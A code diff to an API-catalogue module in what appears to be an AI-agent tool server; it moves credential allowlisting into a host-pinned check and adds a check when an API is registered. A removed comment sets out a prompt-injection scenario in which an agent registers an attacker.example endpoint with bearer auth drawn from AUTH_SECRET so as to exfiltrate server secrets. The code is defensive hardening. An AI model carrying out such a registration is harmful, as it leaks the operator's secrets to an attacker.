@@ -23,6 +23,7 @@ import {
   upsertRecord,
 } from '$lib/datastore';
 import { toToolError } from './_datastore-errors';
+import { authEnvRefusal } from './api-auth-env';
 
 const API_CATALOG = 'api_catalog';
 const ACTOR = 'jkai';
@@ -403,24 +404,8 @@ export async function listCatalogApis(): Promise<
     .sort((a, b) => a.name.localeCompare(b.name));
 }
 
-/**
- * Env vars an API entry's auth may reference. SECURITY CHOKE POINT: catalogue
- * entries are LLM-writable (api_register, or datastore_save straight into
- * api_catalog), so without this allowlist a prompt-injected agent could
- * register `{baseUrl: attacker.example, auth: {kind:'bearer-env',
- * envVar:'AUTH_SECRET'}}` and exfiltrate ANY server secret — the SSRF guard
- * can't help because the attacker's own public host IS the legitimately
- * registered target. Only names listed here (seeded keys + the owner-managed
- * comma-separated API_CATALOG_ALLOWED_ENV env var) ever resolve; everything
- * else is refused at call time, however the entry got into the catalogue.
- */
-function allowedAuthEnvVars(): Set<string> {
-  const extra = (process.env.API_CATALOG_ALLOWED_ENV ?? '')
-    .split(',')
-    .map((s) => s.trim())
-    .filter(Boolean);
-  return new Set(['COMPANIES_HOUSE_API_KEY', ...extra]);
-}
+// Env-var auth is allow-listed AND host-pinned in ./api-auth-env — see there
+// for why the name list alone was not enough.
 
 /**
  * Resolve an entry's auth for a SPECIFIC request URL.
@@ -457,13 +442,10 @@ async function resolveApiAuth(entry: ApiEntry, url: string, method?: string): Pr
   }
 
   if (auth.kind === 'bearer-env' || auth.kind === 'header-env') {
-    if (!allowedAuthEnvVars().has(auth.envVar)) {
-      throw new Error(
-        `API "${entry.name}" references env var ${auth.envVar}, which is not on the API-auth allowlist. ` +
-          `Add it to API_CATALOG_ALLOWED_ENV on the server (owner action), or better: register the credential ` +
-          `in the secret registry at /admin/ai/apis and use auth {kind:"secret",handle:"…"}, which is host-bound.`,
-      );
-    }
+    // Checked against the URL actually being called, not the catalogue's
+    // baseUrl: this is the boundary, however the entry reached the catalogue.
+    const refusal = authEnvRefusal(auth.envVar, new URL(url).hostname);
+    if (refusal) throw new Error(`API "${entry.name}": ${refusal}`);
     const v = process.env[auth.envVar];
     if (!v) throw new Error(`API "${entry.name}" needs env var ${auth.envVar}, which is not set on this host.`);
     const headers = auth.kind === 'bearer-env' ? { Authorization: `Bearer ${v}` } : { [auth.header]: v };
@@ -742,6 +724,10 @@ export async function handleApiRegister(args: Record<string, unknown>): Promise<
     // reached the catalogue — but it turns a confusing runtime 401 into a clear
     // "that credential is not for this host" at registration time.
     const auth = entryIn.auth;
+    if (auth && (auth.kind === 'bearer-env' || auth.kind === 'header-env')) {
+      const refusal = authEnvRefusal(String(auth.envVar ?? ''), new URL(entryIn.baseUrl).hostname);
+      if (refusal) return { success: false, error: `auth rejected: ${refusal}` };
+    }
     if (auth && auth.kind === 'secret') {
       const { getSecretMeta, hostAllowed } = await import('$lib/secrets/registry');
       const meta = await getSecretMeta(auth.handle);
